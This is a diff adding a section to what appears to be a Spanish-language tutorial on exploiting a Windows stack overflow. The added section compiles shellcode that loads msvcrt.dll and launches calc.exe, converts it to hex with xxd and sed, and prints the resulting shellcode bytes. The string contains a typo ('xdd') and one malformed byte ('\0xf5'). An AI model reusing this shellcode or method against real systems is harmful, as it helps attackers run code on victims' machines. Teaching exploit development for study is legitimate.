@@ -40,4 +40,27 @@ Estás direcciones son las correspondientes a las funciones (tercer argumento de
 Ahora haremos el shellcode con las direcciones que hemos conseguido, en <a href="https://wiki.elhacker.net/bugs-y-exploits/overflows-y-shellcodes/exploits-y-stack-overflows-en-windows">esta página</a> podremos encontrar un ejemplo de shellcode, sin embargo este ejecutará la consola, mientras que nuestro proyecto busca ejecutar la calculadora.
 Veremos que la única diferencia se encuentra en las direcciones de memoria y en las líneas con este formato: `mov byte ptr [ebp-08h],63h`
 
-Los 2 números al final de cada línea son cada una las letras (en <a href="https://ascii.cl/es/">hexadecimal</a>) que conformarán el comando a ejecutar, en nuestro caso  `msvcrt.dll` y `calc.exe` (en el caso del ejemplo cmd.exe).
+Los 2 números al final de cada línea son cada una las letras (en <a href="https://ascii.cl/es/">hexadecimal</a>) que conformarán en el primer caso la librería que queremos cargar y en el segundo el comando a ejecutar, `msvcrt.dll` y `calc.exe` respectivamente.
+
+Con esto ya tendríamos el shellcode, pero no nos sirve así, lo necesitamos en hexadecimal para convertirlo en un payload, para esto haremos lo compilaremos
+
+```
+cl shellcode.c
+```
+
+Este comando nos dará un `shellcode.obj` y un `shellcode.exe`. El que nos interesa en este caso es el primero, pero como hemos dicho lo queremos en hexadecimal, para ello usaremos el siguiente comando:
+
+``` 
+xdd -i shellcode.obj
+```
+
+Ahora tenemos que formatear el output que hemos conseguido para que quede de la siguiente forma `\x55\x8b\xec\x33...`, para ello usaremos el siguiente comando
+```
+xxd -i -c1024 shellcode.obj | sed -e 's/0x/\\x/g' | sed -e 's/, //g'|tr -d ,
+```
+Lo que tenemos es básicamente el shellcode compilado pero en un formato que el exploit podrá utilizar. Tendremos que buscar las partes donde haya un `\x55\x8b` que son el principio y el final del comando en ensamblador.
+El código resultante será el siguiente
+```
+\x55\x8b\xec\x33\xff\x57\x83\xec\x0c\xc6\x45\0xf5\x6d\xc6\x45\xf6\x73\xc6\x45\xf7\x76\xc6\x45\xf8\x63\xc6\x45\xf9\x72\xc6\x45\xfa\x74\xc6\x45\xfb\x2e\xc6\x45\xfc\x64\xc6\x45\xfd\x6c\xc6\x45\xfe\x6c\x8d\x45\xf5\x50\xbb\x7b\x1d\x80\x7c\xff\xd3\x55\x8b\xec\x33\xff\x57\x83\xec\x08\xc6\x45\xf7\x63\xc6\x45\xf8\x61\xc6\x45\xf9\x6c\xc6\x45\xfa\x63\xc6\x45\xfb\x2e\xc6\x45\xfc\x65\xc6\x45\xfd\x78\xc6\x45\xfe\x65\x8d\x45\xf7\x50\xbb\xc7\x93\xc2\x77\xff\xd3
+```
+Con esto ya tendríamos todo lo necesario para crear nuestro exploit así que vamos al lío.
